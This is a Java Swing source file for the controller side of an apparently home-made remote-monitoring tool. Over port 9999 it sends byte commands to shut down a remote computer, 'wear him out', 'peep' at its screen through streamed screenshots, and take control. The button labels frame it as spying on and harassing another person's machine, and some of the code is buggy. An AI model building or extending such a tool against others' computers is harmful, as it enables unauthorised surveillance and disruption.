package src.remoteControl;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.image.BufferedImage;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;


public class MyJFrame1 extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = -738642927160907969L;
	JPanel mainPanel ;
	JPanel controlPanel ;
	ImagePanel imagePanel ;
	JScrollPane scrollPane ;
	JTextField ipText ;
	JButton connectButton ;
	JButton connectButton1 ;
	JButton closeButton ;
	JButton closeButton1 ;
	JButton dyingButton ;
	JButton dyingButton1 ;
	JButton obButton ;
	JButton obButton1 ;
	JButton controlButton ;
	JButton controlButton1 ;
	Socket socket ;
	
	/*
	 * 初始化
	 */
	public MyJFrame1(){
		//----------创建组件---------------
		ipText = new JTextField() ;
		connectButton = new JButton("连接") ;
		connectButton1=new JButton("断开");
		closeButton = new JButton("关机") ;
		closeButton1 = new JButton("取消关机") ;
		closeButton.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				closeComputer() ;
			}
		});
		closeButton1.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				closeComputer1() ;
			}
		});
		dyingButton = new JButton("累死他") ;
		dyingButton.addActionListener( new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				dying() ;
				
			}
		});
		dyingButton1 = new JButton("放开他") ;
		dyingButton1.addActionListener( new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				dying1();
			}
		});
		obButton = new JButton("偷窥") ;
		obButton1 = new JButton("不看了") ;
		controlButton = new JButton("控制") ;
		controlButton1 = new JButton("取消控制") ;
		mainPanel = new JPanel() ;
		imagePanel = new ImagePanel() ;
		controlPanel = new JPanel() ;
		scrollPane = new JScrollPane(imagePanel) ;
		
		//-----------------设置组件----------------
		ipText.setBounds( 10 , 10 , 90 , 30 ) ;
		connectButton.setBounds( 110 , 10 , 80 , 30 ) ;
		connectButton.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				connect() ;
			}
		} );
		connectButton1.setBounds( 110 , 43 , 80 , 30 ) ;
		connectButton1.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				connect1() ;
			}
		} );
		closeButton.setBounds( 200 , 10 , 80 , 30 );
		closeButton1.setBounds( 200 , 43 , 80 , 30 );
		dyingButton.setBounds( 290 , 10 , 80 , 30 );
		dyingButton1.setBounds( 290 , 43 , 80 , 30 );
		obButton.setBounds( 380 , 10 , 80 , 30 );
		obButton.addActionListener( new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				observer() ;
				
			}
		});
		obButton1.setBounds( 380 , 43 , 80 , 30 );
		obButton1.addActionListener( new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				flag=false ;
				
			}
		});
		controlButton.setBounds( 470 , 10 , 80 , 30 );
		controlButton.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent arg0) {
				connectScreen();
			}
		});
		controlButton1.setBounds( 470 , 43 , 80 , 30 );
		controlButton1.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent arg0) {
				connectScreen1();
			}
		});
		//------------------添加组件---------------
		controlPanel.setLayout( null );
		controlPanel.add( ipText ) ;
		controlPanel.add( connectButton ) ;
		controlPanel.add( connectButton1 ) ;
		controlPanel.add( closeButton ) ;
		controlPanel.add( closeButton1 ) ;
		controlPanel.add( dyingButton ) ;
		controlPanel.add( dyingButton1 ) ;
		controlPanel.add( obButton ) ;
		controlPanel.add( obButton1 ) ;
		controlPanel.add( controlButton ) ;
		controlPanel.add( controlButton1 ) ;
//		controlPanel.setBackground( Color.RED );
		mainPanel.setLayout( null );
		mainPanel.add( scrollPane ) ;
		mainPanel.add( controlPanel ) ;

 		//------------------设置窗体--------------
		this.add(mainPanel) ;
		this.setTitle( "远程监控" );
		this.setSize( 660 , 450 );
		this.setLocation(60,160);
		this.addComponentListener( new ComponentListener() {
			
			public void componentShown(ComponentEvent e) {
				
			}
			
			public void componentResized(ComponentEvent e) {
				autoLayout() ;
			}
			
			public void componentMoved(ComponentEvent e) {
				
			}
			
			public void componentHidden(ComponentEvent e) {
				
			}
		} );
		this.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE );
		this.setVisible( true );
	}
	
	/***
	 * 连接
	 */ 
	public void connect(){
		try{
			socket = new Socket( ipText.getText() , 9999 ) ;
			JOptionPane.showMessageDialog( this , "连接成功" ) ;
		}catch(Exception e){
			JOptionPane.showMessageDialog( this , "连接失败:" + e.getMessage() ) ;
		}
	}
	/***
	 * 断开连接
	 */ 
	public void connect1(){
//		try{
//			socket = new Socket( ipText.getText() , 9999 ) ;
//			JOptionPane.showMessageDialog( this , "断开连接成功" ) ;
//		}catch(Exception e){
//			JOptionPane.showMessageDialog( this , "断开连接失败:" + e.getMessage() ) ;
//		}

		try {
			OutputStream out = socket.getOutputStream() ;
			while(true){
			out.write( 5 ) ;
			out.flush() ;
//			InputStream in = socket.getInputStream() ;
			JOptionPane.showMessageDialog( this , "断开连接成功" ) ;
			}
		} catch (Exception e) {
			JOptionPane.showMessageDialog( this , "断开连接失败" ) ;
		}
	
	}
//	public void connect1(){
//		try {
//			socket.close() ;
//		} catch (Exception e) {}
//		try{
//			server.close();
//		}catch(Exception e){}
//		socket = null ;
//		server = null ;
//		print( "服务已停止" );
//		startButton.setEnabled( true );
//		stopButton.setEnabled( false );
//		msgText.setEditable(false) ;
//	}
	/***
	 * 控制
	 */
	public void connectScreen(){
		if(socket != null){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 4 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		
		}
	}
	
	public void connectScreen1(){
		if(socket != null){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 8 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		
		}
	}
	
	boolean flag=true;
	public void observer(){
		flag=true;
		if(socket != null){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				new Thread(new Runnable() {
					public void run(){
						try{
							OutputStream out = socket.getOutputStream() ;
							while(flag){
							out.write( 3 ) ;
							out.flush() ;
							InputStream in = socket.getInputStream() ;
							BufferedImage image = ImageIO.read(in) ;
							imagePanel.setImage(image) ;
							}
						}catch(Exception e){

						}
					}
				}).start();
				JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				//命令远程计算机关机
			}}
	}
	
	public void run(){
		try {
			OutputStream out = socket.getOutputStream() ;
			while(true){
			out.write( 3 ) ;
			out.flush() ;
			InputStream in = socket.getInputStream() ;
			BufferedImage image = ImageIO.read(in) ;
			imagePanel.setImage(image) ;
			}
		} catch (Exception e) {
			JOptionPane.showMessageDialog( this , "指令已发送" ) ;
			}
	}

	public void dying(){
		if(socket != null){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 2 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		
		}
	}
	
	public void dying1(){
		if(socket != null){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 6 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		
		}
	}
	
	/***
	 * 关闭远程计算机
	 */
	public void closeComputer(){
		if( socket != null ){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				//命令远程计算机关机
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 1 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		}
	}
	
	public void closeComputer1(){
		if( socket != null ){
			if( socket.isClosed() && !socket.isConnected() ){
				JOptionPane.showMessageDialog( this , "未连接远程计算机");
			}else{
				//命令远程计算机关机
				try{
					OutputStream out = socket.getOutputStream() ;
					out.write( 9 ) ;
					out.flush() ;
					JOptionPane.showMessageDialog( this , "指令已发送" ) ;
				}catch(Exception e){
					JOptionPane.showMessageDialog( this , "指令发送失败:" + e.getMessage() ) ;
				}
			}
		}
	}
	/***
	 * 界面布局
	 */
	public void autoLayout(){
		controlPanel.setBounds( 0 , 0 , mainPanel.getWidth() , 80 ) ;
		scrollPane.setBounds( 0 , controlPanel.getHeight() , mainPanel.getWidth() , mainPanel.getHeight() - controlPanel.getHeight() ) ;
	}
}
